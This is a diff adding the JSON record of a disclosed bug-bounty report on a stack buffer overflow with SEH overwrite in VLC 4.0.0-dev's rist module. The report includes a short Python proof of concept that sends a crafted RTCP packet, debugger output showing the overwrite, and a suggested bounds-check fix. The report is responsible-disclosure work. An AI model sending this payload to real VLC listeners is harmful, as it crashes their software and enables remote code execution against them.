@@ -1,0 +1,122 @@
+{
+  "id": 489102,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80ODkxMDI=",
+  "url": "https://hackerone.com/reports/489102",
+  "title": "VLC 4.0.0 - Stack Buffer Overflow (SEH)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-01-31T14:06:58.630Z",
+  "submitted_at": "2019-01-31T14:06:58.630Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "qrayn",
+    "url": "/qrayn",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/437/978/f3a39e36710dcc07c919e1438164b7a5a2cbb7b9_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 36863,
+    "url": "https://hackerone.com/vlc_h1c",
+    "handle": "vlc_h1c",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/036/863/7e335b4fc788d5e608b72fe2eebbf92f7cd7980d_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/036/863/7e335b4fc788d5e608b72fe2eebbf92f7cd7980d_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "VLC (European Commission - DIGIT)",
+      "twitter_handle": "",
+      "website": "http://ec.europa.eu",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-02-10T20:54:07.452Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-02-09T17:35:56.568Z",
+  "team_member_agreed_on_going_public_at": "2020-02-10T20:54:07.355Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\n\nIncorrect calculation of Buffer Size in rist module for VLC leading to Stack Overflow with SEH chain overwrite.\n\nThe modules/access/rist module has an incorrect calculation of buffer size giving an attacker the possibility to set the buffer size of a local variable by sending a maliciously crafted RTSP packet and overflowing the variable in a proceeding memcpy operation. \n\n**Description:**\n\nIn the static void rtcp_input(...) function a variable new_sender_name is defined with a maximum size of MAX_CNAME (128 bytes). When reading a RTCP_PT_SDES package the length for the memcpy operation is set by the rtcp_sdes_get_name_length(buf) which is taking the 9-10th bit of the buffer and making it possible to change the amount of bytes read into the new_sender_name variable.\n\n_rtcp_input(...) (modules/access/rist.c)_\n```\n/** Sender name is set to max length of MAX_CNAME (128), line: 446 **/\nchar new_sender_name[MAX_CNAME];\n\n/** name_length is read from the RTSP header, line: 489 **/\nint8_t name_length = rtcp_sdes_get_name_length(buf);\n\n/** memcpy new_sender_name with name_length bytes, line: 525 **/\nmemcpy(new_sender_name, buf + RTCP_SDES_SIZE, name_length);\n```\n\nFor this to be exploitable the user has to first actively setup a rist listener using VLC.\n\n## Steps To Reproduce:\n\n  1. Open VLC and bind rist on local port: vlc.exe rist://0.0.0.0:8888\n  2. Edit IP and port configuration in vlc.py\n  3. Execute PoC: ./vlc.py\n\n## Supporting Material/References:\n\n### Proof of Concept\n\n```\n#!/usr/bin/python\nimport socket\n\nserver = (\"192.168.0.23\", 8889)\nudp = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)\n\nbufsize = \"\\x80\" # Amounts of bytes we want read into new_sender_name (128 bytes)\n\nbuf = \"\\x80\"                  # Version and padding\nbuf += \"\\xCA\"                 # packet type = RTCP_PT_SDES\nbuf += \"\\x00\\x00\"             # Record length\nbuf += \"\\x00\\x00\\x00\\x00\\x00\" # SDES record\nbuf += bufsize                # Buffer size of name 9-10 bit\n\n# 64 bit\nbuf += \"A\" * 232 + \"B\" * 8 + \"C\" * 8 + \"D\" * 200 # Buffer for new_sender_name\n\n# 32 bit\n#buf += \"A\" * 568 + \"B\" * 4 + \"C\" * 4 + \"D\" * 50 # Buffer for new_sender_name\n\nudp.sendto(buf, server)\n```\n\n### SEH chain overwrite\n\n0:019> !exchain\n100 stack frames, scanning for handlers...\nFrame 0x01: error getting module for 4242424242424242\nFrame 0x02: error getting module for 4343434343434343\nFrame 0x03: error getting module for 4444444444444444\n\n0:019> !exchain\n3411ff68: 43434343\nInvalid exception stack at 42424242\n\n## Suggested mitigation\n\nExtended bounds checking on line 490 would mitigate this problem.\n\nReplacing the following code on line 490:\n```\nif (name_length > bytes_left)\n```\n\nWith an extended bounds check:\n```\nif (name_length > bytes_left || name_length >= MAX_CNAME)\n```\n\n## Impact\n\n## Impact\nHigh implication buffer overflow causing application crash and SEH record overwrite. Explotation plausible depending on system and security setup.\n\nSuccessful exploitation could lead to remote code execution and full system compromise.\n\nIf the user is using rist this vulnerability would be able to execute remotely.\n\n## Affected versions\nThe code seems to have been introduced in a commit on 5th of November 2018 to the 4.0.0-dev branch. Earlier versions seems unaffected by this vulnerability.",
+  "bounty_amount": "2817.28",
+  "formatted_bounty": "$2,817.28",
+  "weakness": {
+    "id": 4,
+    "name": "Stack Overflow"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2020-03-10T17:35:56.616Z",
+  "allow_singular_disclosure_after": -194478253.50956497,
+  "singular_disclosure_allowed": true,
+  "vote_count": 62,
+  "voters": [
+    "a_d_a_m",
+    "hackerontwowheels",
+    "p1stachios",
+    "letstryharder",
+    "ihsinme",
+    "0xteles",
+    "savitar0x01",
+    "johndoe1492",
+    "stormtide31",
+    "esetal",
+    "and 52 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
